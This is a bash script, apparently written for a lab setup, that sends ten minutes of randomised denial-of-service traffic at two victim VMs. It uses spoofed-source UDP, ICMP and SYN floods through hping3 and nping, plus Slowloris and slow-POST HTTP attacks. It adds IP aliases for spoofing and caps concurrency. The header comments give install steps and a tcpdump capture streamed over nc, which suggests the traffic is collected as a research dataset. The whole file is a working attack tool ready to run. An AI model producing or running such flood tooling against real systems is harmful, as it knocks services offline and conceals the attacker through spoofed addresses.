#!/usr/bin/env bash
#
# dos_vm3_random.sh – DoS & Flood Traffic Generator
#
# • Duration: 600.0s (10.0 min)
# • Random techniques:
#     - udp_flood      (hping3)
#     - icmp_flood     (hping3)
#     - syn_flood      (hping3 + nping)
#     - slowloris      (Python Slowloris)
#     - slowpost       (slowhttptest)
# • Tools (on attacker VM3):
#     sudo apt update
#     sudo apt install -y hping3 nmap slowhttptest curl python3 git
#     git clone https://github.com/gkbrk/slowloris.git ~/slowloris
#
# ▶ PREPARE VM1/VM2 (HTTP/UDP victims):
#   # 1) HTTP Server for Slowloris and SlowPOST:
#   sudo apt update && sudo apt install -y python3
#   nohup python3 -m http.server 80 >/dev/null 2>&1 &
#
# ▶ CAPTURE ON VM1/VM2 (start BEFORE on each victim):
#   sudo tcpdump -U -i enp0s3 -s0 -w - \
#     "net 192.168.56.0/24 and not host 192.168.56.107" \
#     | nc -q 0 192.168.56.107 9999
#
# USAGE (Attacker VM3):
#   sudo ./dos_vm3_random.sh
#

# 1) Root check
if [[ $EUID -ne 0 ]]; then
  echo "Run with sudo for spoofing and raw sockets" >&2
  exit 1
fi

# 2) Dependencies
missing=()
for cmd in hping3 nping slowhttptest curl python3 git; do
  command -v "$cmd" &>/dev/null || missing+=($cmd)
done
# Slowloris script
if ! command -v slowloris &>/dev/null && [[ ! -f "$HOME/slowloris/slowloris.py" ]]; then
  missing+=(slowloris)
fi

if (( ${#missing[@]} )); then
  echo "ERROR: missing tools: ${missing[*]}" >&2
  echo "Install on VM3:" >&2
  echo "  sudo apt update && sudo apt install -y hping3 nmap slowhttptest curl python3 git" >&2
  echo "  git clone https://github.com/gkbrk/slowloris.git ~/slowloris" >&2
  exit 1
fi

# 3) General parameters
duration=600
end_time=$(( SECONDS + duration ))
targets=(192.168.56.101 192.168.56.102)
srcs=(192.168.56.{240..254})
iface=$(ip route | awk '/^default/ {print $5; exit}')
iface=${iface:-enp0s3}

# 4) Create IP aliases on interface
for ip in "${srcs[@]}"; do
  ip addr add "$ip"/24 dev "$iface" 2>/dev/null || :
done

# 5) Available techniques
techs=(udp_flood icmp_flood syn_flood slowloris slowpost)

echo "=== VM3: Random DoS (${duration}s) on $iface ==="

# 6) Main loop
while (( SECONDS < end_time )); do
  tech=${techs[RANDOM % ${#techs[@]}]}
  tgt=${targets[RANDOM % ${#targets[@]}]}
  src=${srcs[RANDOM % ${#srcs[@]}]}
  ts=$(date +%T)
  printf '[%s] %s → %s (src %s)\n' "$ts" "$tech" "$tgt" "$src"

  case "$tech" in
    udp_flood)
      # Massive UDP flood
      hping3 --udp --flood -p $((1024+RANDOM%64511)) \
             --spoof "$src" -I "$iface" "$tgt" \
             &>/dev/null &
      ;;
    icmp_flood)
      # ICMP flood (controlled, avoiding CPU overload)
      hping3 -1 --flood -a "$src" -I "$iface" "$tgt" \
             &>/dev/null &
      ;;
    syn_flood)
      # TCP SYN flood with nping
      RATE=$((10000 + RANDOM % 50000))
      PORT=$((1 + RANDOM % 65535))
      nping --tcp -p $PORT --flags SYN --rate $RATE \
            --source-ip "$src" --interface "$iface" "$tgt" \
            &>/dev/null &
      ;;
    slowloris)
      # Slowloris layer 7 (keeps sockets open)
      python3 "$HOME/slowloris/slowloris.py" -s 150 -v -p 80 "$tgt" \
             &>/dev/null &
      ;;
    slowpost)
      # SlowHTTP POST (sends body very slowly)
      slowhttptest -c 200 -H -g -o /dev/null \
                   -u "http://$tgt:80" \
                   -x 30 -r 10 -t POST \
                   &>/dev/null &
      ;;
  esac

  # Concurrency control (max 6 processes)
  while (( $(jobs -r | wc -l) > 6 )); do
    sleep 0.2
  done

  # Random pause (0.1–0.5s)
  pause=$(LC_NUMERIC=C awk -v min=0.1 -v max=0.5 \
           'BEGIN{srand(); printf "%.2f", min+rand()*(max-min)}')
  sleep "$pause"
done

# 7) Wait for all jobs to finish
echo "Waiting for processes to finish..."
wait
echo "=== Random DoS finished ==="
